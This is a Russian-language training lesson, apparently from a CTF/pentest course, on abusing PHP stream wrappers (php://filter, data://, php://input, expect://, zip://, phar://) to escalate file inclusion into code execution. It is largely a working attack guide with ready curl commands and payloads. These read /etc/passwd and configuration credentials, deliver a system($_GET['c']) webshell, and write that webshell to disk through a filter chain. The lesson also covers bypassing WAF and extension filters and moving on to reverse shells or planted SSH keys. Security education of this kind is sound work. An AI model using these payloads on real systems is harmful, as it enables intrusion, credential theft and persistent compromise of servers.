---
id: web-php-wrappers
title: "PHP-обёртки и inclusion-to-RCE"
category: web
parent: web-lfi-path-traversal
difficulty: hard
order: 3
tags: [php, wrappers, lfi, filter, data, expect, rce]
prerequisites: [web-lfi-path-traversal]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "PHP stream wrappers: php://filter (исходники/цепочки), data://, expect://, input://, zip://, phar:// — от LFI до RCE."
---

PHP stream wrappers — это встроенные протоколы (`php://`, `data://`, `zip://`, `phar://`, `expect://`), которые PHP использует в файловых функциях (`include`, `file_get_contents`, `fopen`, `readfile`). Когда путь к файлу контролируется пользователем (классический LFI), обёртки превращают простое «чтение файла» в утечку исходников, инъекцию кода и RCE. Понимание обёрток — обязательный шаг между «нашёл LFI» и «получил выполнение кода».

## Теория: что такое stream wrappers

PHP регистрирует обёртки, которые обрабатывают URL-подобные пути. Для атакующего важны:

| Обёртка | Что делает | Включена по умолчанию |
|---------|-----------|------------------------|
| `php://filter` | применяет фильтры к потоку (base64, rot13) | да |
| `php://input` | читает тело POST | да |
| `data://` | inline-данные | да (требует `allow_url_include` для include) |
| `expect://` | выполняет команду | нет (нужен модуль expect) |
| `zip://` | читает файл внутри ZIP | да |
| `phar://` | читает phar (метаданные → десериализация) | да |
| `glob://` | перечисляет файлы | да |

Ключевой нюанс: `include`/`require` с `php://`/`data://` требуют `allow_url_include=On` (обычно выключено), но `php://filter` работает всегда.

## php://filter — чтение исходников

Когда `include($_GET['page'])` исполняет PHP, читать исходник через обычный путь бесполезно — он исполнится. `php://filter` позволяет прочитать файл **без исполнения**, применив base64-фильтр:

```bash
curl -s "https://app.example/?page=php://filter/convert.base64-encode/resource=index.php"
```

В ответе — base64 исходника; декодируем:

```bash
echo 'PD9waHAg...' | base64 -d
```

Часто нужно комбинировать фильтры, чтобы обойти WAF/фильтр расширений:

```text
php://filter/read=convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../../etc/passwd
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
```

Читаем конфиги/креды: `config.php`, `.env`, `wp-config.php`, `database.php`.

## Цепочки фильтров → RCE (filter chain)

Главный современный приём: собрать из `php://filter` цепочку, которая **дописывает произвольный PHP-код в начало потока** и заставляет `include` его исполнить. Инструмент `php_filter_chain_generator` генерирует такую цепочку для заданной команды:

```bash
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
# выводит длинную цепочку php://filter/convert.iconv.../resource=php://temp
```

Доставка:

```bash
curl -s "https://app.example/?page=<сгенерированная цепочка>"
```

Требование: `include`/`require` уязвим (или любая функция, исполняющая поток). Работает без `allow_url_include` и без загрузки файла — только `php://filter`.

## data:// — inline-код

Если `allow_url_include=On`:

```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
```

где base64 — это `<?php system($_GET['c']);?>`. Доставка:

```bash
curl -s "https://app.example/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id"
```

Если `allow_url_include=Off`, `data://` в `include` не сработает — используйте filter chain.

## php://input — тело POST

Когда `include` берёт путь из параметра, `php://input` позволяет исполнить тело запроса как PHP:

```bash
curl -s "https://app.example/?page=php://input" --data '<?php system("id"); ?>'
```

Тоже требует `allow_url_include=On`. Полезно, когда нет возможности загрузить файл.

## expect:// — прямая команда

При наличии расширения `expect`:

```bash
curl -s "https://app.example/?page=expect://id"
```

Работает редко (модуль обычно не установлен), но если есть — это мгновенный RCE.

## zip:// и phar://

- **`zip://`** — исполнить PHP внутри ZIP: загружаем zip с `shell.php`, затем `?page=zip://uploads/archive.zip%23shell.php`.
- **`phar://`** — не только чтение, но и авто-десериализация метаданных (см. `web-php-deser-chains`): `?page=phar://uploads/exploit.phar/test`.

`phar://` требует, чтобы файл был валидным phar; PHP < 8.0 триггерит десериализацию в большинстве файловых функций.

## Разобранный пример: LFI → php://filter → креды → RCE

Шаг 1 — находим LFI и подтверждаем чтение:

```bash
curl -s "https://app.example/?page=php://filter/convert.base64-encode/resource=../../etc/passwd"
```

Шаг 2 — читаем исходник и конфиг:

```bash
curl -s "https://app.example/?page=php://filter/convert.base64-encode/resource=config.php" | cut -d/ -f2 | base64 -d
```

Шаг 3 — из конфига достаём креды БД/админки; логинимся или подключаемся к MySQL. Если есть `allow_url_include` — сразу `data://`-webshell.

## Разобранный пример: filter chain RCE

Шаг 1 — генерируем цепочку:

```bash
python3 php_filter_chain_generator.py --chain '<?=`id`;?>'
```

Шаг 2 — подставляем в уязвимый параметр:

```bash
curl -s "https://app.example/?page=$(python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1)"
```

Шаг 3 — в ответе вывод `id`. Для reverse shell меняем команду.

## Где искать

- Параметры `page=`, `file=`, `path=`, `include=`, `template=`, `lang=`, `view=`.
- Функции `include`/`require`/`file_get_contents`/`readfile`/`fopen` с пользовательским путём.
- CMS/плагины с LFI (`wp-content`, `theme=`, `module=`).
- Загрузка файлов + `phar://`/`zip://` для исполнения.
- Признаки: `include(): Failed opening`, `Warning: include`, `php://filter` в ответе.

## Инструменты

- **`php_filter_chain_generator`** — цепочки для RCE.
- **`php://filter`** — ручное чтение исходников.
- **`phpggc`** — phar-payload (см. `web-php-deser-chains`).
- **`ffuf`/`gobuster`** — поиск LFI-параметров и файлов (см. `web-tool-ffuf`).
- **`lfimap`/`LFISuite`** — автоматизация.

## Что дальше / decision

1. Есть `include` с пользовательским путём → проверьте `php://filter/convert.base64-encode/resource=index.php`.
2. Прочитали исходники/креды → ищите `allow_url_include` и другие точки.
3. `allow_url_include=On` → `data://`/`php://input` webshell.
4. Off → filter chain (`php_filter_chain_generator`).
5. Есть загрузка файла → `zip://`/`phar://` для исполнения.
6. RCE → устойчивый канал + read-back.

## Частые ошибки

- **Пытаться читать исходник обычным путём.** PHP его исполнит — нужен `php://filter`.
- **Забыть `allow_url_include`.** `data://`/`php://input` не сработают.
- **Путать `php://filter` и `php://input`.** Разные задачи.
- **Не кодировать `#` в `zip://`.** В URL это `%23`.
- **Считать `expect://` всегда доступным.** Обычно модуль не установлен.
- **Ломать прод.** RCE — только с согласия.

## Полный разбор: filter chain → webshell → read-back (с выводом)

End-to-end: от LFI до устойчивого канала. Цель — `?page=` уходит в `include`.

Шаг 1. Подтверждаем LFI:

```bash
curl -s 'https://app.example/?page=php://filter/convert.base64-encode/resource=index.php' | head -c 80
# PD9waHAK...   -> base64 исходника, LFI подтверждён
echo 'PD9waHAK...' | base64 -d | head
# <?php
```

Шаг 2. Генерируем цепочку для записи webshell на диск (не только для `id`):

```bash
python3 php_filter_chain_generator.py \
  --chain '<?=`echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/s.php`;?>' \
  | tail -1 > /tmp/chain.txt
wc -c /tmp/chain.txt
# 41288 /tmp/chain.txt
```

Шаг 3. Доставляем цепочку. Если она длиннее лимита URL — отправляем через `-G --data-urlencode` или POST:

```bash
curl -s -G 'https://app.example/' --data-urlencode "page@/tmp/chain.txt" -o /dev/null
```

Шаг 4. Read-back: проверяем, что webshell реально создан (не fire-and-forget!):

```bash
curl -s 'https://app.example/s.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
curl -s 'https://app.example/s.php?c=hostname;uname -a'
# web01 Linux web01 5.15.0 ...
```

Если `id` вернулся — канал подтверждён. Дальше — reverse shell или запись SSH-ключа (не гоняйте длинную цепочку повторно).

## Reference-таблица: обёртки, требования, эффект

| Обёртка | Требование | Эффект | Пример |
|---------|-----------|--------|--------|
| `php://filter` | нет | чтение исходников/фильтры | `.../resource=index.php` |
| `php://filter` chain | include | RCE без allow_url_include | `--chain '<?=...?>'` |
| `data://` | `allow_url_include=On` | inline-код в include | `data://text/plain;base64,...` |
| `php://input` | `allow_url_include=On` | тело POST как PHP | `--data '<?php ...'` |
| `expect://` | модуль expect | прямая команда | `expect://id` |
| `zip://` | загруженный zip | исполнение PHP в архиве | `zip://u/a.zip%23s.php` |
| `phar://` | валидный phar | чтение + десериализация | `phar://u/p.phar/x` |
| `glob://` | нет | листинг файлов | `glob:///var/www/*` |
| `compress.zlib://` | нет | распаковка | `compress.zlib://f.gz` |

## Обход фильтров расширений и WAF

- **Суффикс `.php` обязателен?** — обёртки не оканчиваются на `.php`, но если фильтр режет имя файла, применяйте `php://filter/.../resource=...` и кодируйте `resource`.
- **Запрет `php://`:** регистр `PHP://`, двойное кодирование `%70hp://`, добавление пустого параметра `php://filter/.../resource=index.php?` .
- **Запрет `filter`:** `php://filter` → `php://Filter`, `php://fIlTeR`.
- **Запрет `..`:** используйте абсолютные пути (`/var/www/html/config.php`) или `glob://`.
- **Запрет на определённые функции:** если `include` фильтруется, ищите `file_get_contents` + `eval`, `readfile`, `show_source` — вывод исходника без исполнения.
- **Скрытие через base64:** читайте исходники через `convert.base64-encode`, чтобы WAF не увидел PHP-код в ответе.
- **WAF по сигнатуре цепочки:** разбейте доставку на несколько параметров (`?a=php://filter&b=...`) или шлите в теле.

## Что делать дальше / решение

1. **LFI есть** → сразу `php://filter/convert.base64-encode/resource=` для исходников.
2. **Читаем конфиги** (`.env`, `config.php`, `wp-config.php`) — креды БД/админки.
3. **`allow_url_include=On`** → `data://`/`php://input` webshell.
4. **Off** → filter chain (`php_filter_chain_generator`) до записи webshell.
5. **Есть загрузка файла** → `zip://`/`phar://` для исполнения.
6. **RCE подтверждён** → устойчивый канал (webshell/reverse shell) + обязательный read-back (`id`).
7. **Не повторяйте длинную цепочку** — она тяжёлая; используйте её один раз для закрепления.

## Wrapper-трюки в CTF: glob, compress.zlib, загрузка+zip

Дополнительные обёртки, которые выручают, когда filter-chain не проходит:

```bash
# glob:// — листинг файлов (когда чтение конкретного имени запрещено)
curl -s 'https://app.example/?page=glob:///var/www/html/*'
# /var/www/html/index.php /var/www/html/config.php ...

# compress.zlib:// — чтение .gz без распаковки вручную
curl -s 'https://app.example/?page=compress.zlib:///var/log/app.log.gz'

# data:// с URL-encoded (когда base64-часть фильтруется)
curl -s 'https://app.example/?page=data://text/plain,<?php system($_GET[c]);?>&c=id'

# php://fd — чтение открытых дескрипторов (логи, временные)
curl -s 'https://app.example/?page=php://fd/3'
```

Связка «загрузка + zip»: если есть загрузка файла и LFI, загружаем `shell.zip` с `shell.php` внутри, затем `?page=zip://uploads/shell.zip%23shell.php`. Расширение `.zip` обычно проходит фильтр, а `#` в URL кодируется как `%23`. Аналогично `phar://` — но он триггерит десериализацию и опаснее.

Ещё приёмы: `php://temp` (временный поток), `php://memory`, вложенные filter-цепочки с `convert.iconv` для создания нужных байтов, и `read=` / `write=` у `php://filter` для управления направлением. Помните: `include` исполняет поток, поэтому обёртки превращают любое «чтение» в потенциальный RCE.

## Чем wrapper-атака отличается от «простого» LFI

Обычный LFI даёт только чтение файла: вы видите содержимое `/etc/passwd`, но не исполняете код. Stream wrappers меняют саму природу уязвимости:

- **Чтение исходников** — `php://filter` снимает «исполнение» и отдаёт код PHP, который иначе не прочитать.
- **Инъекция кода** — `data://`, `php://input`, filter chain заставляют `include` исполнить ваш код.
- **Исполнение внутри архива** — `zip://`/`phar://` позволяют запустить PHP из загруженного файла.
- **Десериализация** — `phar://` триггерит POP-цепочку без явного `unserialize`.

Поэтому LFI без wrappers — половина уязвимости; умение собрать цепочку определяет, будет ли это чтение конфига или полноценный RCE.

## Квиз

```quiz
- question: "Какая обёртка читает исходник, не исполняя PHP?"
  options:
    - "data://"
    - "php://filter/convert.base64-encode/resource="
    - "expect://"
    - "zip://"
  answer: 1
  explanation: "base64-кодирование потока файла."
- question: "Что нужно для data:// с PHP-кодом?"
  options:
    - "Только LFI"
    - "allow_url_include=On"
    - "TLS"
    - "Cookie"
  answer: 1
  explanation: "Иначе include URL запрещён."
- question: "Что делает expect://?"
  options:
    - "Читает файл"
    - "Выполняет команду (если расширение установлено)"
    - "Кеширует"
    - "Шифрует"
  answer: 1
  explanation: "expect выполняет shell-команду."
- question: "Чем phar:// опаснее zip://?"
  options:
    - "Он быстрее"
    - "Авто-десериализует метаданные phar"
    - "Он шифрует"
    - "Он кеширует"
  answer: 1
  explanation: "Phar-метаданные триггерят POP chain."
- question: "Как filter chain даёт RCE?"
  options:
    - "Читает /etc/passwd"
    - "Генерирует произвольные байты (PHP-код) через iconv-фильтры"
    - "Шифрует"
    - "Кеширует"
  answer: 1
  explanation: "Цепочка фильтров строит код в php://temp."
```

## Где пригодится

- **CTF (Web):** LFI-задачи, почти всегда с обёртками.
- **Bug bounty:** LFI → RCE — критичный отчёт.
- **Пентест:** аудит PHP-приложений.
- **Работа (AppSec):** отключение allow_url_include/expect, allowlist путей, обновление PHP.
